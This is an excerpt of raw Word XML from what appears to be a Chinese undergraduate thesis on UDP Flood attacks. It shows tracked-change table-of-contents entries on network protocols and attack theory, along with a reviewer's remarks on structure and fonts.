          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="277" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522674"</w:instrText>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>参考文献</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522674 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="278" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>53</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4535B18A" w14:textId="29DED3B8" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="279" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="280" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="281" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="282" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>摘要</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>I</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="37E8D619" w14:textId="5D9ADC84" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="283" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="284" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="285" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="286" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>Abstract</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>II</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7A6A4430" w14:textId="404CD410" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="287" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="288" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="289" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="290" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>1.</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noProof/>
            </w:rPr>
            <w:delText>绪论</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>1</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="59C6CDBD" w14:textId="1E0B366F" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="291" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="292" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="293" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="294" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>1.1</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课题背景</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>（DDos不能引出UDP Flood攻击吧。应从攻击开始写，别从DDos开始）</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>1</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3ACF9F81" w14:textId="2CD5BF3F" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="295" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="296" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="297" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="298" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>1.2</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课题发展状况</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:hint="eastAsia"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>（</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>“</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:hint="eastAsia"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>课题发展状况</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>”</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:hint="eastAsia"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>的字体和</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>“</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>课题背景</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>”</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:hint="eastAsia"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>的</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:noProof/>
            </w:rPr>
            <w:delText xml:space="preserve"> </w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:hint="eastAsia"/>
              <w:noProof/>
            </w:rPr>
            <w:delText>不一样，看目录）</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>2</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4A26FB85" w14:textId="2BC29BF5" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="299" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="300" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="301" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="302" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>1.3</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>研究的目的</w:delText>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              <w:noProof/>
              <w:kern w:val="16"/>
            </w:rPr>
            <w:delText>（以下内容参考张海阳的写）</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>2</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="548BE71F" w14:textId="29CCEF23" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="303" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="304" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="305" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="306" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>1.4</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任务完成情况</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>2</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="162E66E2" w14:textId="4BA87CD7" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="307" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="308" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="309" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="310" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.</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UDP Flood攻击相关理论</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>3</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D2D9EAE" w14:textId="56EE1DC4" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="311" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="312" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="313" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="314" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.1</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UDP Flood攻击相关网络协议</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>3</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2A2D43FE" w14:textId="644ABB46" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="315" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="316" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="317" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="318" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.1.1</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ARP协议</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>3</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="25962564" w14:textId="2156E1FD" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="319" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="320" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="321" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="322" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.1.2</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ICMP协议</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>4</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0C253710" w14:textId="792229CC" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="323" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="324" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="325" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="326" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.1.3</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IP协议</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>4</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0ABE0A1A" w14:textId="066A6BBE" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="327" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="328" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="329" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="330" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.1.4</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UDP协议</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>5</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="37963E25" w14:textId="17AA6E28" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="331" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="332" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="333" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="334" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>2.2</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UDP Flood攻击相关技术</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>6</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="19DADBD9" w14:textId="2F19B8A0" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
